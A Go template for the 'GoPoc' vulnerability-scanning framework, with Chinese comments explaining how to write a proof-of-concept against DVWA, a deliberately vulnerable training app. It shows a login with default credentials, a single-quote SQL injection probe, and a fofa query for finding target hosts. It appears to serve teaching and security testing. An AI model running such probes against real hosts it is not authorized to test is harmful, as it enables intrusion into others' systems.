package User

import (
	"GoPoc/main/Developer/AllFormat"
	"GoPoc/main/Developer/HttpAbout"
	"GoPoc/main/User/Utils"
	"net/http"
	"strings"
)

var Json string
var Poc func(hostInfo string, client *http.Client) bool
var Exp func(expResult Format.ExpResult, client *http.Client) Format.ExpResult

// Poc 编写,以 dvwa 靶场的sql注入为例
func init() {
	// 有代码使用代码,无代码使用json
	// 如果存在代码,可以不写Json格式(即Json格式有架构,但内容为空).但必须存在 fofa语句
	// 此处的json只是说明json的使用方式,与代码模式并无关联
	Json = `{
  	// 值非必须,如果有值则使用Poc设置的协程数(在这里是10),否则使用全局协程数,全局协程数不写也行,默认使用200
  	"Coroutine":"10",
  	// 值非必须,如果有值则不使用fofa查询,而直接访问该File对应的文件,比如url.txt
  	"File":"",
  	// 值非必须,如果有值则不使用fofa查询,而直接访问该Url,比如 http://www.baidu.com ,要带http://或https://
  	"Url":"https://www.baidu.com",
    // 必须,表明想要查找的fofa语句.
    "Fofa":"body=\"Login :: Damn Vulnerable Web Application\"",
    "Uri" : "/dvwa/"  // 这个uri指的是探测模式是所要访问的uri
    // 请求包
    "Request":{
        // 请求方法
    "Method": "GET",
     // 请求路径,这里分别请求两个uri
    "Uri": [
          "/robots.txt",
               "/hello.txt"
          ],
    // 自定义 header 头
    "Header":{
      "Accept-Encoding":"gzip"
    }
  },
    // 响应包
    "Response":{
        // 定义多个Group之间的关系,有AND和OR这两种,其中AND是都满足漏洞才存在,OR是其中一个条件满足即可.
    "Operation":"OR",
        // 判断条件
    "Group":[
               // 条件1
        {
                    // 支持正则表达式
                     "Regexp": ".*?",
              "Header":{
                                // 状态码
                                  "Status": "200"
                  },
              // response Body ,同样是支持多个Body,当都符合时为True
              "Body":[
                          "Hello World",
                                 "wahaha"
                  ]
          },
               // 条件2
               {
              "Header":{
                                // 状态码
                                  "Status": "200"
                  }
          }
      ]

}
}`

	getSessionByLogin := func(hostInfo string, client *http.Client) (string, error) {
		// 发起登录请求 --> 302跳转 --> 获取请求包中的session , 并返回
		config := HttpAbout.NewHttpConfig()
		config.Uri = "/dvwa/"
		config.Client = client
		resp, err := HttpAbout.SendHttpRequest(hostInfo, config)
		if err != nil {
			return "", err
		}
		config.Header["Cookie"] = resp.Header["Set-Cookie"][0]
		config.Body = "username=admin&password=password&Login=Login&user_token=" + Utils.RandomStringByModule(24, 1)
		config.Uri = "/dvwa/login.php"
		resp, err = HttpAbout.SendHttpRequest(hostInfo, config)
		if err != nil {
			return "", err
		}
		if !strings.Contains(resp.Body, "Welcome :: Damn Vulnerable Web ") {
			return "", err
		}
		return resp.Header["Set-Cookie"][0], nil
	}

	// 建议: 函数名+随机命名
	sendLoginByToken455445 := func(hostInfo string, client *http.Client) (Format.CustomResponseFormat, error) {
		var err error
		var customResponse Format.CustomResponseFormat
		config := HttpAbout.NewHttpConfig()
		config.Header["Cookie"], err = getSessionByLogin(hostInfo, client) // (非强制) 自定义Header头
		if err != nil {
			return customResponse, nil
		}
		config.Header["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
		config.Header["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0" // (非强制) 如果不写的话随机从默认URL列表上选取一个
		config.TimeOut = 5                                                                                               // (非强制) 如果不写的话默认值为 5秒
		config.Method = "GET"                                                                                            // (非强制) 如果不写的话默认值为 GET方式
		//config.Body = `123`       // (非强制) 如果不写的话默认值为 ""
		config.Uri = "/dvwa/index.php" // (非强制) 如果不写的话默认值为 ""
		config.Client = client         // (强制) 因为这个 client 挂上了burpSuite代理,如果你使用自己的client可能会因为没有挂代理而无法得知利用过程,会不好写poc/exp
		return HttpAbout.SendHttpRequest(hostInfo, config)
	}

	// 建议: 函数名+随机命名
	sendSqlPayload5251552 := func(hostInfo string, client *http.Client) (Format.CustomResponseFormat, error) {
		config := HttpAbout.NewHttpConfig()
		config.Header["Cookie"] = "security=low; PHPSESSID=1abcbe73869e90560e9061ca636c813e"
		config.Uri = "/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#"
		config.Client = client
		return HttpAbout.SendHttpRequest(hostInfo, config)
	}

	// 如果使用代码模式, Poc函数为必须,其中的参数固定
	Poc = func(hostInfo string, client *http.Client) bool {
		resp, err := sendLoginByToken455445(hostInfo, client)
		if err != nil {
			return false
		}
		if !strings.Contains(resp.Body, "Welcome to Damn") {
			return false
		}
		resp, err = sendSqlPayload5251552(hostInfo, client)
		return err == nil && strings.Contains(resp.Body, "You have an error in your SQL syntax;")
	}

	// 如果使用代码模式, Exp函数为必须,其中的参数固定
	// Exp 你可以尝试自己写一下:
	Exp = func(expResult Format.ExpResult, client *http.Client) Format.ExpResult {
		return expResult
	}
}
